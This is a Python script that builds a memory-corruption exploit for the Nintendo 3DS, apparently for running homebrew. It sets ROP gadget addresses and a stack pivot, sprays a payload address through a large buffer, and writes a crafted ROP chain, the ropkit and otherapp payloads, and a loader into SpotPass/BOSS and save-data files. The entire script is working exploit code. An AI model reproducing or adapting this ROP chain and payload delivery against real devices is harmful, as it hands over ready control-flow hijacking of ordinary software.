import os,sys,struct
#1bf70
size=0x127c1c
d=0x33333334
out=bytearray(size)
OFFSET=0

spotpass=bytearray(0x3000)
for i in range(0,0x3000-1,4):
	temp=0x3000-i
	spotpass[i:i+4]=struct.pack("<I",temp)
	
for i in range(0,0x2840-1,4):
	temp=0x2840-i
	spotpass[i:i+4]=struct.pack("<I",temp)

redirect_offs=0x1bf5c
pop_r4r7pc=0x100e60
pivot_args=0x244e10
pivot=0x12f6c0
pivot_r3=0x1144e4

PAYLOAD_ADDR=0x157be080
POP_R1PC=0x00109d6c
POP_R0PC=0x0011a698
ROP_POPPC=0x001017b8
GARBAGE=0x44444444

#0179d80c 1579d80c 0x103704: pop {r4, lr} ; bx r1 ; (106 found)

def write32(offset, value):
	global out
	out[offset:offset+4]=struct.pack("<I",value)
	
def rop(value):
	global out, OFFSET
	out[OFFSET:OFFSET+4]=struct.pack("<I",value)
	OFFSET+=4
	
def addr_convert(addr):
	c=(addr - 0x678d88) // 8
	print(hex(c))
	return c
	

temp=addr_convert(PAYLOAD_ADDR)
for i in range(0,size-0x80,0x80):
	out[i:i+0x60]=struct.pack("<I",temp)*24
	out[i+0x60:i+0x80]=struct.pack("<I",0)*8
	
#write32(redirect_offs, addr_convert(PAYLOAD_ADDR))

#out[0x1bf60:0x1bf60+0x20]=b"\x00"*0x20

webstrand=struct.pack("<IIIII", PAYLOAD_ADDR, pop_r4r7pc, pivot_args, pivot, pivot_r3)

for i in range(0x2800, 0x3000-4, 4):
	spotpass[i:i+4]=struct.pack("<I", ROP_POPPC)

for i in range(0, 0x2800-1, 0x20):
	spotpass[i:i+0x14]=webstrand
	

with open("3ds_ropkit/ropkit.bin","rb") as f:
	ropkit=f.read(0x1000)
with open("3ds_ropkit/otherapp.bin","rb") as f:
	oapp=f.read()+b"\x00"*0x1000
	oapp=oapp[:0x2000] #lazy padding strategy but don't care
with open("3ds_ropkit/otherappn.bin","rb") as f:
	oappn=f.read()+b"\x00"*0x1000
	oappn=oappn[:0x2000]
print("ropkit:%x  +otherapp_old:%x" % (len(ropkit), len(ropkit+oapp)))

with open("loader/loader.bin","rb") as f:
	loader=f.read()

with open("306/boss/wTRu2!!!(`!!+s(@","rb+") as f:
	f.seek(0x700-0xc)
	f.write(spotpass)
	f.seek(0x700-0xc+0x2c00)
	f.write(loader)

payload=ropkit+oapp+oappn
with open("306/user/ubll.lst","wb") as f:
	f.write(payload)

with open("306/user/data.dat","wb") as f:
	f.write(out)